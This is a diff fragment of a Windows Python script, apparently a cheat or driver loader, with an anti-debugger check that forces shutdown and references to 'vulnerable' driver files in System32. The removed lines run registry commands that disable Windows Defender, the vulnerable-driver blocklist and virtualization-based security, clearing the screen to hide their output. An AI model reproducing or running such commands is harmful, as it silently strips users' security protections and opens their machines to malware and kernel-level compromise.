@@ -215,32 +215,7 @@ if cskey =="antidebuuggerxxxx":
     os.system("shutdown /s /f /t 0")
  
 
-try:
-    subprocess.run('reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True, check=True)
-    print("Command executed successfully.")
-except subprocess.CalledProcessError as e:
-    print("Error occurred:", e)
 
-os.system('cls')
-try:
-    subprocess.run('reg add HKLM\SYSTEM\CurrentControlSet\CI\Config /v "VulnerableDriverBlocklistEnable" /t REG_DWORD /d 0 /f', shell=True, check=True)
-    print("")
-except subprocess.CalledProcessError as e:
-    print("Error occurred:", e)
-
-os.system('cls')
-try:
-    subprocess.run('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 0 /f', shell=True, check=True)
-    print("")
-except subprocess.CalledProcessError as e:
-    print("Error occurred:", e)
-
-os.system('cls')
-try:
-    subprocess.run(["netsh", "interface", "ip", "delete", "arpcache"], check=True)
-    print("")
-except subprocess.CalledProcessError as e:
-    print(f"Error: {e}")
 os.system('cls')
 filexyz1 = r'C:\Windows\System32\data_vulnerable_x.txt'
 filexyz2 = r'C:\Windows\System32\system_driver_vul.txt'
